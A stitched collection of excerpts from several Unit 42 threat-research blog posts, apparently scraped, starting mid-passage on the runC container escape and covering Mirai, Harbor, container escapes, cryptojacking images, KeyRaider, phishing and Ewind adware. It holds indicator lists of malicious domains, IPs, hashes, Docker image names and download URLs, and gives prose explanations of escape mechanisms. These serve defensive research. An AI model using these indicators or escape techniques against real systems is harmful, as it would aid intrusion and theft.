runC binary is owned by root.The next time runC is executed, the attacker will achieve code execution on the host. Since runC is normally run as root (e.g. by the Docker daemon), the attacker will gain root access on the host.\nThe image above might mislead some to believe the vulnerability (i.e. tricking runC into executing itself) is redundant. That is, why can't an attacker simply overwrite /proc/[runc-init-pid]/exe instead?A patch for a similar runC vulnerability,CVE-2016-9962, mitigates this kind of attack.CVE-2016-9962 revealed that the runC init process possessed open file descriptors from the host which could be used by an attacker in the container to traverse the host's filesystem and thus break out of the container. Part of the patch for this flaw was setting the runc init process as 'non-dumpable' before it entering the container.\nIn the context of CVE-2019-5736, the 'non-dumpable' flag denies other processes from dereferencing /proc/[pid]/exe, and therefore mitigates overwriting the runC binary through /proc/[runc-init-pid]/exe[1]. Calling execve drops this flag though, and hence the new runC process' /proc/[runc-pid]/exe is accessible.\nThe vulnerability may appear to contradict the way symbolic links are implemented in Linux.Symbolic links simply hold the path to their target. For a runC process, /proc/self/exe should contain something like /usr/sbin/runc.When a symlink is accessed by a process, the kernel uses the path present in the link to find the target under the root of the accessing process.That begs the question \u2013when a process in the container opens the symbolic link to the runC binary, why doesn't the kernel searches for the runC path inside the container root?\nThe answer is that /proc/[pid]/exe does not follow the normal semantics for symbolic links. Technically this might count as a violation ofPOSIX, but as I mentioned earlier procfs is a special filesystem. When a process opens /proc/[pid]/exe, there is none of the normal procedure of reading and following the contents of a symlink. Instead, the kernel just gives you access to the open file entry directly.", "source": "Palo"}, {"title": "Introduction", "content": "Aviv Sasson, a security researcher from the cloud division of Unit 42, has identified a critical vulnerability in a widespread cloud native registry called Harbor. The vulnerability allows attackers to take over Harbor registries by sending them a malicious request.\nThe maintainers of Harbor releaseda patchthat closes this critical security hole. Versions1.7.6and1.8.3include this fix.\nUnit 42 has found 1,300 Harbor registries open to the internet with vulnerable default settings, which are currently at risk until they're updated.", "source": "Palo"}, {"title": "Background", "content": "As part of our initiative to contribute to and improve Cloud Native Computing Foundation(CNCF) projects, I recently looked at the Harbor project. I found a critical privilege escalation vulnerability that allows anyone to gain admin permissions under its default settings. The vulnerability had been assignedCVE-2019-16097, which was made public on September 10.\nHarboris an open source cloud native registry that stores, signs and scan images for vulnerabilities. Harbor integrates with Docker Hub, Docker Registry, Google Container Registry and other registries. It provides a simple GUI that allows users to download, upload and scan images according to their permissions.\nThe Harbor project has been gradually growing in popularity over the last four years and became aCNCF incubating projectlast November. Harbor includes many notable sponsors and companieswithin its adopters page.\nFigure 1. Officially recognized users and partners of Harbor", "source": "Palo"}, {"title": "Introduction", "content": "We are providing a content warning because the following contains usage of a racial slur by a threat actor, which is not condoned in any instance by Unit 42. Unit 42 has partially redacted the racial slur to provide researchers with the ability to identify it and check IoCs as needed.", "source": "Palo"}, {"title": "Summary", "content": "From July to December 2022, Unit 42 researchers observed a Mirai variant called V3G4, which was leveraging several vulnerabilities to spread itself. The vulnerabilities exploited include the following:\nCVE-2012-4869: FreePBX Elastix Remote Command Execution Vulnerability \nGitorious Remote Command Execution Vulnerability \nCVE-2014-9727: FRITZ!Box Webcam Remote Command Execution Vulnerability \nMitel AWC Remote Command Execution Vulnerability \nCVE-2017-5173: Geutebruck IP Cameras Remote Command Execution Vulnerability \nCVE-2019-15107: Webmin Command Injection Vulnerability \nSpree Commerce Arbitrary Command Execution Vulnerability \nFLIR Thermal Camera Remote Command Execution Vulnerability \nCVE-2020-8515:DrayTek Vigor Remote Command Execution Vulnerability \nCVE-2020-15415: DrayTek Vigor Remote Command Injection Vulnerability \nCVE-2022-36267: Airspan AirSpot Remote Command Execution Vulnerability \nCVE-2022-26134: Atlassian Confluence Remote Code Execution Vulnerability \nCVE-2022-4257: C-Data Web Management System Command Injection Vulnerability\nOnce the vulnerable devices are compromised, they will be fully controlled by attackers and become a part of the botnet. The threat actor has the capability to utilize those devices to conduct further attacks, such as distributed denial-of-service (DDoS) attacks. The exploit attempts captured by Unit 42 researchers leverage the aforementioned vulnerabilities to spread V3G4, which targets exposed servers and networking devices running Linux.\nPalo Alto NetworksNext-Generation Firewallcustomers receive protections throughcloud-delivered security servicessuch asIoT Security,Advanced Threat Prevention,WildFire, andAdvanced URL Filtering, which can help detect and block the exploit traffic and malware.", "source": "Palo"}, {"title": "Conclusion", "content": "The vulnerabilities mentioned above have less attack complexity than previously observed variants, but they maintain a critical security impact that can lead to remote code execution. Once the attacker gains control of a vulnerable device in this manner, they could take advantage by including the newly compromised devices in their botnet to conduct further attacks such as DDoS. Therefore, it is highly recommended that patches and updates are applied when possible.\nPalo Alto Networks customers receive protection from the vulnerabilities and malware discussed above through the following products and services:\nNext-Generation Firewallswith a Threat Prevention security subscription can help block the attacks with Best Practices via Threat Prevention signatures56254,56954,92632,55935,55933,58668,35131,55798,57897,56256,55934,93332and93392. \nAdvanced Threat Preventionhas an inbuilt machine learning-based detection that can detect vulnerability exploits in real-time. \nWildFirecan help stop the malware with static signature detections. \nAdvanced URL FilteringandDNS Securityare able to block the C2 domain and malware-hosting URLs. \nThe Palo Alto NetworksIoT Securityplatform can leverage network traffic information to identify the vendor, model and firmware version of a device and identify specific devices that are vulnerable to particular CVEs. \nIn addition, IoT Security has inbuilt machine learning-based anomaly detection that can alert the customer if a device exhibits nontypical behavior such as a sudden appearance of traffic from a new source, an unusually high number of connections or an inexplicable surge of certain attributes typically appearing in IoT application payloads.", "source": "Palo"}, {"title": "Indicators", "content": "Infrastructure\ncomeanalyze.8x19[.]com\n176.123.9[.]238198.98.49[.]79104.244.72[.]64\nArtifacts\n0837de91aa6bd52ef79d744daba4238a5a48a79eb91cb1a727da3e97d5b36329c32f8df3cb019e83e0ac49ab0462c59ec70733c3d516ade011727408751c9d42f295904d966889afb0f6b3625e504a1420a978434e2b6a9e9b85b688a44593fa\nJuly Campaign\n7bc99c87a1e0582b5f15f40141226862fbe726b496e1e77c7f95993e8e94573388f7b9a8c4f9bb28582c485549b328d6123e8aea33009ce7657f7fc0ef829e0364545e94daafba191669333e1dd0c6e1190df47e0742bd515911cce0cdbd4fd169bb44736817dabe88e3014c6207ba702f644fb43f6feaec23091af0b5224bc6eaa387fcc12f2d8a7d42f12d27e7dccb4f3e11492a7d3a3a1ce830a11b539d28a987d1e113b858d21596bb2dfffe79721d5149bfa782e693aafc0cf47aa8c6dcafca95eb143e0180f1594517a44b2d226a2e44de5cbd2cd49b8c6cdb2a0b61eeb651f9320f07d7eade9af523297b4bcfd0e0af187272e368e889c988a55ed78e6229041985c466c131e48b9ba0d1bb80bdb7556c941ee84aa461fe2efbf1e8531dc4777dac6dc4e8c650241e211311c4a418a35ebded72fcdd6bcb965ccf918b3e69e8ed741ab39b0914f7e95bf13b2f0ae9f3c1227dcffdea3369e03e8bb792b2e4ee94783062658ddf2c41e9acafb401d0f93e3848c027383a5ca19289b786dd91943b0d453ace3b19779c88da19c9a386dd3e9d2322c85a4cdcf84a22c663a93d999dc0515066c5c2a261f1be47233b358889d0594c14409309818d86347d\nSeptember Campaign\n31926da5ca004a11c1f46947edb220afe3a53f81cf245b3afae7ea1abaec7c38eed4690f6e4d92b511fcde9a712b1a8405c5333e0ad78a4c676a64b22412e149210f3f1ffd2ec66a5076a7fea5d83caa8bbcdb0f3bc3bd030c77eded6f4b5d9073cc00acc478bf09658a679a4689f34598fe6e92086efe82900242f3cc5b7aec1218da43a62da76927484bca73a3eee53425c54625147f8d01149bcef2f09d1e2944db28e4505fc439599dae15b10bf57b7cf6c2597f618f41b99bfc65443c614bffc171c0748cc9e3398b1ce8135b125f54f46752768c981c45d3390e8359a1b3a17934f6f72941b9a60097ab09228d873a2f8737ee0ea93b08e5f1cc3916d1916e00391279b014e53d73c2216a84bd528e18f1f633ba0101288aa963f77c5b7dea8dac3f455f3a57fecfa5a047439126556858c239e73cd8feec2dc13bae2ca10ce475f64f3821ab32c88f6b013effd40843dd575ceaab46a57f134c2478b6d9b5199f36fc416d8a87d798926e0d9dcbb2fe97610cf08d6887dae1355e9439feda096ed8ddf4206365d326b3b7cb2d57ca1e89999b0b1da80fb9658dff6e44\nDecember Campaign:\n63ACD589A53BDEC49C624F3CB2FC8319218DF721F486E2F15F3C07ABED97AAE61cf3879d9e93d1ff30ce5ec0f64ff15b1db7d8237160c83efed688d800e5ef12c5be50880e2b5a8a8d43a5f1fd6f5d36fc665ab9b4031a9b6a4d52222004c2c19b7f36cabbb90dfe9cd75f12c01fb64766dd1ec0f4247dbf8f4477dd64407fbf7d9cdf3afb1d52f49d82b1ffe28a3da08c6aeeaa8c5047ba37c73802d2cd9ec29a0d39265b53e1959df49dbc8727ad344abc12a8bc0bd8d8b76f8b150525dca6d00fbfc439cb9c5c850690134b0d51f262021c0d04d9934df464980c346c1dc5b4f23a88de9b566ce980a8188674319039d2fbe13b049859f8fe4821c92f92003f3fb70e16d65f5f4b21777b87c9aae6072022c3dfbefd177f37c8aef4a6aeee67379740ed15e8da8604cc1f0ea715c8641674de66e553c461b3ae782a5d0cbeab3d61a76197003822252124e89987d061d6a4a33b9891cea778d3708cd504476f654198e8efd5aff1c7a903353967d0e96aeff0402cb0a79fabbc10d18c63d2c288c200cf7bbebe7a81fd42ca1bd4c6cb6080f28f2cec297a0d3e6aff7876fe", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers have been tracking a widespread malicious JavaScript (JS) injection campaign that redirects victims to malicious content such as adware and scam pages. This threat was active throughout 2022 and continues to infect websites in 2023.\nWe detected the injected JS code on more than 51,000 websites, including hundreds of websites in Tranco's top 1 million website ranking list. The presence of affected websites in Tranco indicates that this campaign could have impacted a large number of people.\nWe also found that this campaign is multifaceted in that it performs multistep injections before redirecting to malicious web pages, and uses obfuscation and benign append attacks to bypass detections. Malware authors leverage these techniques to inject multiple variants of malicious JS code samples into the websites.\nOur novel adversarial deep learning technique, Innocent Until Proven Guilty (IUPG), detected multiple variants of the injected JS code. This model is part of the Advanced URL Filtering (AUF) subscription of our Next-Generation Firewall offering. It detects malicious JS samples and classifies content from both our offline crawlers as well as inline protection, which performs a real-time analysis of traffic on the firewall.", "source": "Palo"}, {"title": "Conclusion", "content": "A widespread malicious JavaScript injection campaign was detected on more than 51,000 websites throughout 2022 and early 2023. We found that malware authors obfuscate malicious JS to bypass detection and perform multistep injections before redirecting to malicious web pages.\nThe injected JS code has potentially impacted a large number of internet users since hundreds of the infected websites were ranked among the Tranco top 1 million websites. We recommend that website owners and customers keep third-party plugins and software updated to protect their websites from such injections.\nThe injected malicious JS code in this campaign is one common example of append attacks that we see in the wild. The training procedure of ourIUPG modelis specifically designed to identify and isolate malicious subpatterns in a background of benign content, as explained in our work on the IUPG modelpublished in IEEE Security and Privacy Workshops(SPW).\nOur deep learning model Innocent Until Proven Guilty (IUPG) detected multiple variants of the injected malicious JS code. This model is part of one of the detection capabilities of the Advanced URL Filtering cloud-delivered security service that detects malicious JS samples. It also classifies content from both our offline crawlers as well as inline, real-time analysis of traffic on the firewall.\nNext-Generation Firewall customers who useAdvanced URL FilteringandDNS Securitysubscriptions are protected against known URLs and hostnames of the malicious JS injection campaign described in this blog. We are also providing a link toknown indicators of compromiseto help combat the threats discussed in this post.\nUpdated March 24, 2023, at 9:01 a.m. PT.", "source": "Palo"}, {"title": "Introduction", "content": "As a cybercriminal, there are many ways to make a profit. One of the easiest ways is cryptojacking \u2013 the illegal use of someone else's computing resources to mine cryptocurrencies. Container images are known as a simple way to distribute software, yet malicious cryptojacking images are also a simple way for attackers to distribute their cryptominers.\nI decided to take an extensive look into Docker Hub and discovered 30 malicious images with a total number of 20 millionpulls(which means the images were downloaded 20 million times), together accounting for cryptojacking operations worth US$200,000. In this post, I will elaborate on my findings and why it is reasonable to assume that there are many other undiscovered malicious images on Docker Hub and other public registries.\nPalo Alto NetworksPrisma Cloudcustomers are protected from these threats through the Cryptominers Runtime Detection feature and theTrusted Images feature. In addition, Palo Alto Networks Next-Generation Firewall customers with theThreat Preventionsecurity subscription are protected against the delivery of these images.", "source": "Palo"}, {"title": "Conclusion", "content": "The cloud presents big opportunities for cryptojacking attacks. In my research, I used a cryptomining scanner that only detects simple cryptomining payloads. I also made sure any identified image was malicious by correlating the wallet address to previous attacks. Even with these simple tools, I was able to discover tens of images with millions of pulls. I suspect that this phenomenon may be bigger than what I found, with many instances in which the payload is not easily detectable.\nPalo Alto NetworksPrisma Cloudcustomers are protected from these threats through the Cryptominers Runtime Detection feature and theTrusted Images feature. In addition, Palo Alto Networks Next-Generation Firewall customers with theThreat Preventionsecurity subscription are protected against the delivery of these images.\n021982/155_138\n021982/66_42_53_57\n021982/66_42_93_164\n021982/xmrig\n021982/xmrig1\n021982/xmrig2\n021982/xmrig3\n021982/xmrig4\n021982/xmrig5\n021982/xmrig6\n021982/xmrig7\navfinder/gmdr\navfinder/mdadmd\ndocheck/ax\ndocheck/health\ndockerxmrig/proxy1\ndockerxmrig/proxy2\nggcloud1/ggcloud\nggcloud2/ggcloud\nkblockdkblockd/kblockd\nosekugatty/picture124\nosekugatty/picture128\ntempsbro/tempsbro\ntempsbro/tempsbro1\ntoradmanfrom/toradmanfrom\ntoradmanfrom/toradmanfrom1\nxmrigdocker/docker2\nxmrigdocker/docker3\nxmrigdocker/xmrig\nxmrigdocker/xmrig\nzenidine/nizadam", "source": "Palo"}, {"title": "Introduction", "content": "On May 12, 2015, Unit 42 observed an apparent watering hole attack, also known as a strategic website compromise (SWC), involving the President of Myanmar's website. Visiting the main page hosted at \"www.president-office.gov[.]mm\" triggered the malicious content, as the threat actors injected an inline frame (IFRAME) into a JavaScript file used by Drupal for the site's theme.\nUnit 42 believes threat actors chose this website to set up a watering hole in order to target and gather information on individuals in Myanmar, individuals involved in political relations with the country and/or organizations doing business in Myanmar. Unit 42 has evidence to suggest the threat actors have had access to the website since November 2014 if not earlier.\nShortly after we reported the infection to the operators of the website, they took it offline. A new website containing the same content is hosted at \"www.myanmarpresidentoffice.info\", which has several artifacts and references to the original content hosted at \"president-office.gov.mm\" but does not contain the exploit code. We believe the use of the new domain may be part of their remediation process.\nThis blog discusses the known details of the watering hole, interesting characteristics of the delivered Evilgrab sample (AKA Vidgrab) and the threat infrastructure associated with the attack.", "source": "Palo"}, {"title": "Conclusion", "content": "Threat actors compromised the President of Myanmar's website to create a watering hole to infect visitors to the website. Based on data collected in our threat intelligence cloud, the watering hole was active and delivering a malicious payload during May 2015. Open source intelligence suggests that the site may have been a watering hole containing an exploit for CVE-2014-6332 in November 2014 as well. Setting up a watering hole on this site suggests the threat actors, possibly comprising more than one group, are looking to collect information on individuals in Myanmar, individuals involved in political relations with the country and/or organizations doing business in Myanmar.\nThe May 2015 watering hole delivered a variant of the Evilgrab Trojan to visitors via an unknown vulnerability. The Evilgrab payload itself uses an interesting anti-analysis technique to increase the complexity required to analyze the Trojan. In addition, the Evilgrab payload delivered by this watering hole shares infrastructure that has hosted C2 servers for other Evilgrab payloads, as well as samples of the 9002 Trojan.  The threat actors have used this infrastructure in attacks since at least 2013.\nThis watering hole attack shows threat groups' continued adoption of this attack vector, as it is much more difficult to analyze and detect than the typical spear-phishing attacks. Once a threat actor has control over the web server hosting the watering hole, the actor can control when to start and stop the delivery of the malicious content, which requires constant monitoring of traffic to the website to determine if and when the attack occurs. However, in this case the threat actors reused old infrastructure to host the C2 servers for the delivered payload, which made detection and attribution easier.\n[1] https://www.virustotal.com/en/url/91f7d6612c79cc0b266891c447359853614546837b003836ab342b091ee1a6cc/analysis/[2] https://www.virustotal.com/en/file/b8c37a1db36d702932b5db97ec150269a323b5dc76059062beff7e330f2d136d/analysis/[3] http://blog.trendmicro.com/trendlabs-security-intelligence/evilgrab-malware-family-used-in-targeted-attacks-in-asia/[4] http://pwc.blogs.com/files/cto-tib-20150223-01a.pdf[5] http://contagiodump.blogspot.com/2013/09/sandbox-miming-cve-2012-0158-in-mhtml.html", "source": "Palo"}, {"title": "Indicators", "content": "Domainsusafbi.websecexp[.]comusacia.websecexp[.]comwebhttps.websecexp[.]comusagovdns.websecexp[.]comceshi.mailpseonfz[.]comdns.mailpseonfz[.]comdns.websecexp[.]comns.websecexp[.]comappeur.gnway[.]ccmmslsh.tiger1234[.]com\nSHA256 values:EvilGrab10d9611e5b4ff41fc79e8907e3eb522630131b1bdc1010a0564c8780ba55c87cRelated Downloader Trojanb69106e06dc008e4fa1e4a0b0b58fcb1dc6d2016422a35cb3111168fd3fae577", "source": "Palo"}, {"title": "Introduction", "content": "In my last post aboutreverse engineering Windows containers, I outlined the internal implementation of Windows Server Containers. After further investigating Windows Server Containers, I learned that running any code in these containers should be considered as dangerous as running admin on the host. These containers are not designed for sandboxing, and I found that escaping them is easy. Microsoft collaborated with us in fully understanding the security limitations of these containers. The purpose of this post is to raise awareness of the danger of running these containers.\nTo demonstrate this issue, I will present a container escape technique in Windows containers that I recently discovered. The technique allows processes running inside containers to write files to their host. This could be leveraged to achieve RCE (remote code execution) on the host. In Kubernetes environments, this exploit could be easily leveraged to spread between nodes. In other words, an attacker that successfully breaches a single application instance running inside a Windows Server Container could trivially breach the boundaries of the container and access other applications on the same machine. In the case of Kubernetes, the attacker could even access other machines. This may allow an attacker to gain access to a complete production workload after breaching just one endpoint instance.\nThis issue may affect users of cloud providers allowing the use of Windows Server Containers, including all of Microsoft's AKS users using Windows. Palo Alto Networks customers are protected from this via Prisma\u2122 Cloud.", "source": "Palo"}, {"title": "Conclusion", "content": "In this post, I have demonstrated a complete technique to escalate privileges and escape Windows Server Containers. Users should follow Microsoft's guidance recommending not to run Windows Server Containers and strictly use Hyper-V containers for anything that relies on containerization as a security boundary. Any process running in Windows Server Containers should be assumed to be with the same privileges as admin on the host. In case you are running applications in Windows Server Containers that need to be secured, we recommend moving these applications to Hyper-V containers.\nI would like to thankAlex IonescuandJames Forshawfor advising me with this research.\nPalo Alto NetworksPrisma\u2122 Cloudprotects customers from having their containers compromised. Prisma Cloud Compute also provides a compliance feature calledTrusted Imagesthat allows restricting users to run only known and signed images. By using this feature, customers can further reduce the attack surface by preventing execution of malicious images.", "source": "Palo"}, {"title": "Introduction", "content": "Recently, WeipTech was analyzing suspicious Apple iOS tweaks reported by users and found over 225,000 valid Apple accounts with passwords stored on a server.\nIn cooperation with WeipTech, we have identified 92 samples of a new iOS malware family in the wild. We have analyzed the samples to determine the author's ultimate goal and have named this malware \"KeyRaider\". We believe this to be the largest known Apple account theft caused by malware.\nKeyRaider targets jailbroken iOS devices and is distributed through third-party Cydia repositories in China. In total, it appears this threat may have impacted users from 18 countries including China, France, Russia, Japan, United Kingdom, United States, Canada, Germany, Australia, Israel, Italy, Spain, Singapore, and South Korea.\nThe malware hooks system processes through MobileSubstrate, and steals Apple account usernames, passwords and device GUID by intercepting iTunes traffic on the device.  KeyRaider steals Apple push notification service certificates and private keys, steals and shares App Store purchasing information, and disables local and remote unlocking functionalities on iPhones and iPads.\nKeyRaider has successfully stolen over 225,000 valid Apple accounts and thousands of certificates, private keys, and purchasing receipts. The malware uploads stolen data to its command and control (C2) server, which itself contains vulnerabilities that expose user information.\nThe purpose of this attack was to make it possible for users of two iOS jailbreak tweaks to download applications from the official App Store and make in-app purchases without actually paying. Jailbreak tweaks are software packages that allow users to perform actions that aren't typically possible on iOS.\nThese two tweaks will hijack app purchase requests, download stolen accounts or purchase receipts from the C2 server, then emulate the iTunes protocol to log in to Apple's server and purchase apps or other items requested by users. The tweaks have been downloaded over 20,000 times, which suggests around 20,000 users are abusing the 225,000 stolen credentials.\nSome victims have reported that their stolen Apple accounts show abnormal app purchasing history and others state that their phones have been held for ransom.\nPalo Alto Networks and WeipTech have provided services to detect the KeyRaider malware and identify stolen credentials. In the remainder of this blog, we provide details about the malware and the attacks.", "source": "Palo"}, {"title": "Introduction", "content": "Threat actors have always been adept at keeping abreast of worldwide trends \u2013 ranging from geopolitical to technical \u2013 and rapidly exploiting these trends for their benefit. The current pandemic is no exception. Unit 42 has previously reported on howcybercriminals have preyed on consumers during COVID-19and onthe use of COVID-19 themed phishing attacks impersonating brands like Pfizer and BioNTech. This article provides early warnings for the travel industry and global travelers by sharing information about various attack attempts targeting the travel industry.\nAt the beginning of the pandemic, when people all over the world scrambled to get protective supplies \u2013 personal protective equipment, sanitizer and toilet paper \u2013 threat actors tried to take advantage of supply issues by selling fake products. They also tried to trick people by purporting to be credible health organizations (such as the WHO) or pharmaceutical companies, all while the actual organizations and companies were trying to make sense of the virus and come up with metrics, protective measures and vaccines.\nAlthough the pandemic is not over, as the world opens up borders and the vaccines slow down the spread of the virus, people who have been cooped up at home are eager to travel. Threat actors are taking advantage of this trend by using travel as a theme for phishing people and stealing data \u2013 account credentials, financial information and so on \u2013 subsequently selling this data in underground markets.\nHere, we first show that there has been a substantial increase in the registration of travel-related phishing URLs in 2021. Second, we provide two real-life examples demonstrating attackers abusing the travel theme, including the Dridex malware distribution and the abuse of Firebase in phishing campaigns. Third, we talk about how threat actors use various data that they steal. Finally, we conclude with a discussion of best practices for both individuals and organizations.\nPlease note that Palo Alto NetworksNext-Generation Firewallcustomers are protected from phishing attacks with various security services, includingAdvanced URL FilteringandWildFire.", "source": "Palo"}, {"title": "Conclusion", "content": "The travel industry and international travelers have been long-term targets for cybercriminals, suffering financial and reputational damage. Threat actors not only sell fabricated information but also stolen information that they gather through phishing attacks. During the pandemic, we noticed that travel-themed products and services offered by cybercriminals in underground marketplaces decreased significantly, possibly due to low demand. However, as travel resumes, we expect travelers and the travel industry to be targeted again due to the high profitability associated with this data. Therefore, it is important to be aware of phishing campaigns.\nBest practices to protect yourself and your organization from phishing attacks include:\nFor individuals:\nExercise caution when clicking on any links or attachments contained in suspicious emails, especially those relating to one's account settings or personal information, or otherwise trying to convey a sense of urgency. \nVerify the sender's address for any suspicious emails in your inbox. \nDouble-check the URL and security certificate of each website before inputting your login credentials. \nReport suspected phishing attempts.\nFor organizations:\nImplement security awareness training to improve employees' ability to identify fraudulent emails. \nRegularly back up your organization's data as a defense against ransomware attacks initiated via phishing emails. \nEnforce multi-factor authentication on all business-related logins as an added layer of security.\nPalo Alto Networks customers are protected by:\nAdvanced URL Filtering: Detects unknown, newly malicious URLs in milliseconds instead of minutes, preventing successful attacks. \nWildFire: All known samples are identified as malware. \nAutoFocus: Tracking related activity using the Dridex tag.", "source": "Palo"}, {"title": "Indicators", "content": "soleravacation[.]net/wp-content/plugins/mojo-marketplace-wp-plugin-is-broke/inc/cli/mxq6awnfhnmadd2.php \nanimalairlines[.]org/wp-content/plugins/wordpress-seo/inc/options/tk2xzwhphujenf.php \nhxxp://go7wallet.com/app/plugins/cordova-plugin-statusbar/src/browser/HLn3obcR1vMJZNt.php \nhxxps://www.dropbox[.]com/s/qmi112rc4ns75eb/Confidential_123.xls?dl=1 \nhxxps://www.dropbox[.]com/s/pfs4wf7a8mzxxkf/Notification%20%23591501.xls?dl=1 \nhxxps://www.dropbox[.]com/s/dz2b5ypqvoy7tpa/Reports%2078497.xls?dl=1 \nhxxps://www.dropbox[.]com/s/azswbhh7gmxouk2/Rep%20%231018.xls?dl=1 \nhxxps://www.dropbox[.]com/s/myz2ytmvd08vfl4/Invoice%20%2392899.xls?dl=1 \nhxxps://www.dropbox[.]com/s/66j21yxz64fwfg2/Documentation%20644.xls?dl=1 \nhxxps://www.dropbox[.]com/s/81pphar6s4e93vz/Detailed%20079.xls?dl=1 \nhxxps://www.dropbox[.]com/s/yryqu9i368uib62/Report_%23_301.xls?dl=1 \nhxxps://www.dropbox[.]com/s/1ds4kb2limantm5/Notification_836524.xls?dl=1 \nhxxps://www.dropbox[.]com/s/yo9cy2y1su23ga1/Rep%20%23621.xls?dl=1 \nhxxps://www.dropbox[.]com/s/zakw3n6nvxqoyav/Subconract%20415.xls?dl=1 \nhxxps://www.dropbox[.]com/s/7vgj2bvv3vnd8dj/Note%20%2383008.xls?dl=1 \nhxxps://www.dropbox[.]com/s/l1bl35aybsvu8wl/Notification_71823.xls?dl=1 \nhxxps://www.dropbox[.]com/s/myoyguvb1qhrwsk/Reports_6633.xls?dl=1 \nhxxps://www.dropbox[.]com/s/4xecieojug0y28l/Information%20714353.xls?dl=1 \nhxxps://www.dropbox[.]com/s/glyefet40tkve8u/Contract%2030964.xls?dl=1 \nhxxps://www.dropbox[.]com/s/6f1amba84r7sf4a/Inv%204529.xls?dl=1 \nhxxps://www.dropbox[.]com/s/8y95urd2as2eeu8/Inv%20%23147.xls?dl=1 \nhxxps://www.dropbox[.]com/s/9wj6fcxxw29sfcp/Contract_724269.xls?dl=1 \nhxxps://www.dropbox[.]com/s/qu6npuiok79zpeo/Inv_225.xls?dl=1 \nhxxps://www.dropbox[.]com/s/ckihhm4uaxfi5hs/Report_18392.xls?dl=1 \nhxxps://www.dropbox[.]com/s/ryyogkwdvwof8rs/Scan%20108.xls?dl=1 \nhxxps://www.dropbox[.]com/s/5jgm0ktunwiby10/Subconract_848.xls?dl=1 \nhxxps://www.dropbox[.]com/s/luee4b7upuo2kak/Rep%20%23226186.xls?dl=1 \nhxxps://www.dropbox[.]com/s/c6rqxbq9ydl2sd1/Reports%20%2348406.xls?dl=1 \nhxxps://www.dropbox[.]com/s/4jczljfya09ye2o/Notification_30123.xls?dl=1 \nhxxps://www.dropbox[.]com/s/f62i6djdmb4qm6b/Subconract_1541.xls?dl=1 \nhxxps://www.dropbox[.]com/s/cvrhnc9h6e9ny1y/Contract_%23_599848.xls?dl=1 \nhxxps://www.dropbox[.]com/s/5nz7l5ftiu48irm/Fax%20740.xls?dl=1 \nhxxps://www.dropbox[.]com/s/atagwpkwhmpmvi4/Detailed_%23_670.xls?dl=1 \nhxxps://www.dropbox[.]com/s/v0hmuvpunssgon3/Note%202365.xls?dl=1 \nhxxps://www.dropbox[.]com/s/9779leob93657a9/Invoice_%23_76493.xls?dl=1 \nhxxps://www.dropbox[.]com/s/agx2xx6bbpetdh7/Copy_%23_824.xls?dl=1 \nhxxps://www.dropbox[.]com/s/l3d6i2x6f2ui9pk/Notice%200118.xls?dl=1", "source": "Palo"}, {"title": "Introduction", "content": "In December 2024, we uncovered an attack chain that employs distinct, multi-layered stages to deliver malware like Agent Tesla variants, Remcos RAT or XLoader. Attackers increasingly rely on such complex delivery mechanisms to evade detection, bypass traditional sandboxes, and ensure successful payload delivery and execution. The phishing campaign we analyzed used deceptive emails posing as an order release request to deliver a malicious attachment.\nThis multi-layered attack chain leverages multiple execution paths to evade detection and complicate analysis. Figure 1 below illustrates the attack chain used by this campaign.\nThe campaign arrives to victims as emails with attached archives. These archives contain script-based malware that ultimately infects a host with the final malware.\nOur analysis demonstrates how we can track and mitigate threats that rely on multi-stage delivery mechanisms. Additionally, we highlight techniques for analyzing AutoIt-based malware and debugging shellcode to equip analysts with better threat-hunting capabilities. Despite this multi-layered approach used by the attackers,Advanced WildFireeffectively detects each stage, ensuring our customers are better protected against such attacks.\nAdditionally, Palo Alto Networks customers are better protected from the threats discussed above through the following products:\nCloud-delivered security servicesfor the Next-Generation Firewall includingAdvanced URL FilteringandAdvanced DNS Security \nCortex XDRandXSIAM\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "This analysis highlights how attackers increasingly rely on multi-layered delivery mechanisms and multiple execution paths to evade detection. By stacking simple stages instead of focusing on highly sophisticated techniques, attackers can create resilient attack chains that complicate analysis and detection. However, with its memory detection capabilities,Advanced WildFirecan detect and better protect its customers.\nAdditionally, Palo Alto Networks customers are better protected from the threats discussed above through the following products:\nAdvanced URL FilteringandAdvanced DNS Securityidentify known domains and URLs associated with this activity as malicious. \nCortex XDRandXSIAMare designed to:Prevent the execution of known malicious malware, and also prevent the execution of unknown malware using Behavioral Threat Protection and machine learning based on the Local Analysis module.Protect against credential gathering tools and techniques using the new Credential Gathering Protection available from Cortex XDR 3.4.Detect post-exploit activity with behavioral analytics through Cortex XDR Pro. \nPrevent the execution of known malicious malware, and also prevent the execution of unknown malware using Behavioral Threat Protection and machine learning based on the Local Analysis module. \nProtect against credential gathering tools and techniques using the new Credential Gathering Protection available from Cortex XDR 3.4. \nDetect post-exploit activity with behavioral analytics through Cortex XDR Pro.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Since mid-2016 we have observed multiple new samples of the Android Adware family \"Ewind\". The actors behind this adware utilize a simple yet effective approach \u2013 they download a popular, legitimate Android application, decompile it, add their malicious routines, then repackage the Android application package (APK). They then distribute the trojanized application using their own, Russian-language-targeted Android Application sites.\nSome of the popular Android applications that Ewind targets include GTA Vice City, AVG cleaner, Minecraft - Pocket Edition, Avast! Ransomware Removal, VKontakte, and Opera Mobile.\nAlthough Ewind is fundamentally adware, monetization through displaying advertising on the victim device, it also includes other functionality such as collecting device data, and forwarding SMS messages to the attacker. The adware Trojan in fact potentially allows full remote access to the infected device.\nThe applications, injected advertising, application sites \u2013 and, we believe, the attacker, are all Russian.", "source": "Palo"}, {"title": "Summary", "content": "Ewind is more than simply Adware. Ewind is, at very least, an actual Trojan \u2013 subverting genuine Android apps. The functionality to forward SMS messages to a C2 hints at possible intentions beyond just delivering adware. Of real concern is that although we've only observed these Trojans being used to deliver advertising to victims, as our analysis shows, with device-admin access and the functionality to download and execute any file on the device, the actor behind this activity can easily take full control of the victim device.\nWhile identifying a Malware author as Russian is not at all surprising, usually Russian actors 